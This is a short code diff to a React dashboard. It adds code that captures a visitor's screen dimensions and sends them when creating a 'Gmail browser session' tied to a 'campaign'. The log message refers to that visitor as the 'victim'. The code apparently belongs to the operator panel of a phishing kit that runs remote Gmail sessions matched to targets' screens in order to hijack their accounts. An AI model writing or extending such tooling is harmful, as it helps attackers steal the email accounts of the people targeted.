@@ -175,17 +175,25 @@ const Dashboard = () => {
     if (!selectedCampaign) return;
     
     try {
+      // Get user's screen dimensions
+      const screenWidth = window.screen.width;
+      const screenHeight = window.screen.height;
+      
+      console.log(`📐 Creating Gmail session with victim's screen dimensions: ${screenWidth}x${screenHeight}`);
+      
       // Generate a simple session token (in production, this should be done server-side)
       const sessionToken = Math.random().toString(36).substring(2) + Date.now().toString(36);
       const response = await httpClient.post('/api/gmail-browser/create-session', {
         sessionToken,
-        campaignId: selectedCampaign.id
+        campaignId: selectedCampaign.id,
+        screenWidth,
+        screenHeight
       });
       
       if (response.data.success) {
         // Refresh the sessions list
         checkGmailSessions();
-        console.log('Gmail browser session created:', response.data.session);
+        console.log('Gmail browser session created with custom dimensions:', response.data.session);
       }
     } catch (error) {
       console.error("Error creating Gmail session:", error);
